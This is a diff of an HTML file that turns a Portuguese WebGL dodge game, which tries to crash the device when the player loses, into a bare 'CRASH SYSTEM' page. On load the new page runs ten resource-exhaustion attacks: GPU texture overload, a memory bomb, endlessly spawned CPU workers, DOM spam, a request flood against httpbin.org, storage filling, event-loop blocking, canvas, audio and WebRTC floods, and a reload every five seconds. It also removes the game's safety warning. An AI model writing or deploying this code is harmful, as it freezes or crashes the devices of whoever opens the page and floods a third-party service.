@@ -1,254 +1,179 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Jogo WebGL com Crash Extremo</title>
-    <style>
-        body { margin: 0; background: #000; color: #fff; font-family: Arial; text-align: center; }
-        canvas { border: 2px solid #fff; display: block; margin: 0 auto; }
-        #status { position: absolute; top: 10px; left: 10px; font-size: 18px; }
-        #warning { margin: 10px; color: red; font-weight: bold; }
-    </style>
+    <title>CRASH SYSTEM</title>
 </head>
 <body>
-    <div id="warning">PERIGO: Perder PODE DANIFICAR SEU DISPOSITIVO! Teste apenas em máquina virtual ou hardware descartável.</div>
-    <div id="status">Use o mouse para evitar o círculo vermelho!</div>
-    <canvas id="gl-canvas" width="800" height="600"></canvas>
-
     <script>
-        // Inicializa WebGL
-        const canvas = document.getElementById('gl-canvas');
-        const gl = canvas.getContext('webgl');
-        if (!gl) {
-            alert('WebGL não suportado. Use Chrome/Firefox atualizado.');
-            document.getElementById('status').textContent = 'Erro: WebGL não suportado.';
-            throw new Error('WebGL não suportado');
-        }
-
-        // Shaders
-        const vertexShaderSource = `
-            attribute vec2 a_position;
-            uniform vec2 u_resolution;
-            void main() {
-                vec2 clipSpace = (a_position / u_resolution) * 2.0 - 1.0;
-                gl_Position = vec4(clipSpace * vec2(1, -1), 0.0, 1.0);
-            }
-        `;
-        const fragmentShaderSource = `
-            precision highp float;
-            uniform vec4 u_color;
-            void main() {
-                vec4 color = u_color;
-                for (int i = 0; i < 1000; i++) {
-                    color += vec4(0.0001 * float(i));
-                }
-                gl_FragColor = color;
-            }
-        `;
-
-        // Compila shaders
-        function createShader(gl, type, source) {
-            const shader = gl.createShader(type);
-            gl.shaderSource(shader, source);
-            gl.compileShader(shader);
-            if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
-                const error = gl.getShaderInfoLog(shader);
-                document.getElementById('status').textContent = 'Erro no shader: veja console.';
-                console.error('Erro no shader:', error);
-                gl.deleteShader(shader);
-                throw new Error('Shader falhou');
-            }
-            return shader;
-        }
-
-        // Cria programa
-        const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
-        const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
-        const program = gl.createProgram();
-        gl.attachShader(program, vertexShader);
-        gl.attachShader(program, fragmentShader);
-        gl.linkProgram(program);
-        if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
-            const error = gl.getProgramInfoLog(program);
-            document.getElementById('status').textContent = 'Erro no programa: veja console.';
-            console.error('Erro no programa:', error);
-            throw new Error('Programa falhou');
-        }
-        gl.useProgram(program);
-
-        // Atributos e uniformes
-        const positionLocation = gl.getAttribLocation(program, 'a_position');
-        const resolutionLocation = gl.getUniformLocation(program, 'u_resolution');
-        const colorLocation = gl.getUniformLocation(program, 'u_color');
-        gl.uniform2f(resolutionLocation, canvas.width, canvas.height);
-
-        // Estado do jogo
-        let playerPos = { x: 400, y: 300 };
-        let enemyPos = { x: 100, y: 100 };
-        let gameOver = false;
-
-        // Vértices do jogador (quadrado 40x40)
-        const playerVertices = new Float32Array([
-            -20, -20,  20, -20,  -20, 20,
-            20, -20,  20, 20,  -20, 20
-        ]);
-        const playerBuffer = gl.createBuffer();
-
-        // Vértices do inimigo (círculo com 12 lados, raio 25)
-        const enemyVertices = new Float32Array(generateCircleVertices(12, 25));
-        const enemyBuffer = gl.createBuffer();
-
-        function generateCircleVertices(sides, radius) {
-            const vertices = [];
-            for (let i = 0; i < sides; i++) {
-                const angle1 = (i / sides) * Math.PI * 2;
-                const angle2 = ((i + 1) / sides) * Math.PI * 2;
-                vertices.push(0, 0);
-                vertices.push(radius * Math.cos(angle1), radius * Math.sin(angle1));
-                vertices.push(radius * Math.cos(angle2), radius * Math.sin(angle2));
-            }
-            return vertices;
-        }
-
-        // Movimento do jogador
-        canvas.addEventListener('mousemove', (e) => {
-            const rect = canvas.getBoundingClientRect();
-            playerPos.x = e.clientX - rect.left;
-            playerPos.y = e.clientY - rect.top;
-        });
-
-        // Desenhar objeto
-        function drawObject(buffer, vertices, pos, color) {
+        // 1. WebGL OVERLOAD
+        function crashWebGL() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return;
+            
+            // 10M pontos
+            const vertices = new Float32Array(10000000);
+            const buffer = gl.createBuffer();
             gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-            const translatedVertices = new Float32Array(vertices.length);
-            for (let i = 0; i < vertices.length; i += 2) {
-                translatedVertices[i] = vertices[i] + pos.x;
-                translatedVertices[i + 1] = vertices[i] + pos.y;
+            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+            
+            // 100 texturas 16K
+            for (let i = 0; i < 100; i++) {
+                const texture = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+                const size = 16384;
+                const data = new Uint8Array(size * size * 4);
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
             }
-            gl.bufferData(gl.ARRAY_BUFFER, translatedVertices, gl.STATIC_DRAW);
-            gl.enableVertexAttribArray(positionLocation);
-            gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
-            gl.uniform4f(colorLocation, ...color);
-            gl.drawArrays(gl.TRIANGLES, 0, vertices.length / 2);
+            
+            // Loop infinito de draw calls
+            function drawLoop() {
+                for (let i = 0; i < 1000; i++) {
+                    gl.drawArrays(gl.POINTS, 0, 10000000);
+                }
+                requestAnimationFrame(drawLoop);
+            }
+            drawLoop();
         }
 
-        // Colisão
-        function checkCollision() {
-            const dx = playerPos.x - enemyPos.x;
-            const dy = playerPos.y - enemyPos.y;
-            return Math.sqrt(dx * dx + dy * dy) < 45;
+        // 2. MEMORY BOMB
+        function crashMemory() {
+            setInterval(() => {
+                const arrays = [];
+                for (let i = 0; i < 1000; i++) {
+                    arrays.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB cada
+                }
+            }, 0);
         }
 
-        // Múltiplos métodos de crash
-        function crashSystem() {
-            document.getElementById('status').textContent = 'VOCÊ PERDEU! TENTANDO CRASHAR O SISTEMA...';
-            try {
-                // 1. WebGL: 2 milhões de pontos
-                const vertexCount = 2000000;
-                const crashVertices = new Float32Array(vertexCount * 2);
-                for (let i = 0; i < vertexCount * 2; i += 2) {
-                    crashVertices[i] = Math.random() * canvas.width;
-                    crashVertices[i + 1] = Math.random() * canvas.height;
-                }
-                const crashBuffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
-                gl.bufferData(gl.ARRAY_BUFFER, crashVertices, gl.STATIC_DRAW);
-
-                // Texturas enormes
-                const textures = [];
-                for (let i = 0; i < 50; i++) {
-                    const texture = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_2D, texture);
-                    const size = 8192;
-                    const data = new Uint8Array(size * size * 4);
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
-                    textures.push(texture);
-                }
-
-                // Loop WebGL
-                function crashWebGLLoop() {
-                    gl.clear(gl.COLOR_BUFFER_BIT);
-                    gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
-                    gl.enableVertexAttribArray(positionLocation);
-                    gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
-                    gl.uniform4f(colorLocation, 1, 0, 0, 1);
-                    for (let i = 0; i < 10; i++) {
-                        gl.drawArrays(gl.POINTS, 0, vertexCount);
-                    }
-                    requestAnimationFrame(crashWebGLLoop);
-                }
-                crashWebGLLoop();
-
-                // 2. Memória
-                setTimeout(() => {
-                    while (true) {
-                        const arr = new Array(1000000).fill(new Float32Array(1000));
-                    }
-                }, 100);
-
-                // 3. Web Workers (CPU)
-                function crashWorkers() {
-                    const blob = new Blob(['while(true){for(let i=0;i<1000000;i++){Math.sin(i);}}'], { type: 'text/javascript' });
-                    const url = URL.createObjectURL(blob);
-                    new Worker(url);
-                    setTimeout(crashWorkers, 10);
-                }
-                crashWorkers();
-
-                // 4. DOM
-                setTimeout(() => {
-                    while (true) {
-                        for (let i = 0; i < 1000; i++) {
-                            const div = document.createElement('div');
-                            div.style.width = '100px';
-                            div.style.height = '100px';
-                            document.body.appendChild(div);
+        // 3. CPU FORK BOMB
+        function crashCPU() {
+            function spawnWorker() {
+                const blob = new Blob([
+                    `self.onmessage = function() {
+                        while(true) {
+                            for(let i=0;i<10000000;i++) {
+                                Math.sqrt(Math.random());
+                            }
                         }
-                    }
-                }, 200);
-
-                // 5. Rede (limitado por CORS)
-                setTimeout(() => {
-                    while (true) {
-                        fetch('https://example.com', { mode: 'no-cors' }).catch(() => {});
-                    }
-                }, 300);
-            } catch (e) {
-                document.getElementById('status').textContent = 'Crash falhou: veja console.';
-                console.error('Erro no crash:', e);
+                    }`
+                ], { type: 'application/javascript' });
+                
+                const worker = new Worker(URL.createObjectURL(blob));
+                worker.postMessage('start');
+                setTimeout(() => spawnWorker(), 1);
+            }
+            
+            // Inicia múltiplos workers
+            for (let i = 0; i < navigator.hardwareConcurrency * 2; i++) {
+                spawnWorker();
             }
         }
 
-        // Loop do jogo
-        function gameLoop() {
-            if (gameOver) return;
+        // 4. DOM SPAM
+        function crashDOM() {
+            setInterval(() => {
+                for (let i = 0; i < 10000; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = 'x'.repeat(1000000);
+                    document.body.appendChild(div);
+                }
+            }, 0);
+        }
 
-            // Mover inimigo
-            const dx = playerPos.x - enemyPos.x;
-            const dy = playerPos.y - enemyPos.y;
-            const dist = Math.sqrt(dx * dx + dy * dy);
-            enemyPos.x += (dx / dist) * 3;
-            enemyPos.y += (dy / dist) * 3;
-            enemyPos.x = Math.max(25, Math.min(canvas.width - 25, enemyPos.x));
-            enemyPos.y = Math.max(25, Math.min(canvas.height - 25, enemyPos.y));
+        // 5. NETWORK FLOOD
+        function crashNetwork() {
+            const urls = [
+                'https://httpbin.org/delay/1',
+                'https://httpbin.org/status/200',
+                'https://httpbin.org/uuid'
+            ];
+            
+            setInterval(() => {
+                for (let i = 0; i < 100; i++) {
+                    fetch(urls[i % urls.length], { 
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                        keepalive: true
+                    }).catch(() => {});
+                }
+            }, 0);
+        }
 
-            // Desenhar
-            gl.clearColor(0.0, 0.0, 0.0, 1.0);
-            gl.clear(gl.COLOR_BUFFER_BIT);
-            drawObject(playerBuffer, playerVertices, playerPos, [0, 1, 0, 1]);
-            drawObject(enemyBuffer, enemyVertices, enemyPos, [1, 0, 0, 1]);
+        // 6. STORAGE FILL
+        function crashStorage() {
+            try {
+                const data = 'x'.repeat(1024 * 1024);
+                while (true) {
+                    localStorage.setItem('crash' + Math.random(), data);
+                    sessionStorage.setItem('crash' + Math.random(), data);
+                }
+            } catch(e) {}
+        }
 
-            // Colisão
-            if (checkCollision()) {
-                gameOver = true;
-                crashSystem();
-            } else {
-                requestAnimationFrame(gameLoop);
+        // 7. EVENT LOOP BLOCK
+        function crashEventLoop() {
+            while(true) {
+                Promise.resolve().then(() => {});
+                setTimeout(() => {}, 0);
+                requestAnimationFrame(() => {});
             }
         }
 
-        // Iniciar
-        gameLoop();
+        // 8. CANVAS BOMB
+        function crashCanvas() {
+            for (let i = 0; i < 100; i++) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 32768;
+                canvas.height = 32768;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = 'black';
+                ctx.fillRect(0, 0, 32768, 32768);
+                document.body.appendChild(canvas);
+            }
+        }
+
+        // 9. AUDIO CONTEXT OVERLOAD
+        function crashAudio() {
+            try {
+                for (let i = 0; i < 100; i++) {
+                    const audioContext = new AudioContext();
+                    const oscillator = audioContext.createOscillator();
+                    oscillator.connect(audioContext.destination);
+                    oscillator.start();
+                }
+            } catch(e) {}
+        }
+
+        // 10. WEBRTC FLOOD
+        function crashWebRTC() {
+            try {
+                for (let i = 0; i < 50; i++) {
+                    const pc = new RTCPeerConnection();
+                    pc.createDataChannel('crash');
+                    pc.createOffer().catch(() => {});
+                }
+            } catch(e) {}
+        }
+
+        // EXECUTAR TUDO SIMULTANEAMENTE
+        crashWebGL();
+        crashMemory();
+        crashCPU();
+        crashDOM();
+        crashNetwork();
+        crashStorage();
+        crashCanvas();
+        crashAudio();
+        crashWebRTC();
+        
+        // Event loop block por último
+        setTimeout(crashEventLoop, 100);
+        
+        // Loop adicional para garantir
+        setInterval(() => {
+            location.reload();
+        }, 5000);
     </script>
 </body>
 </html>
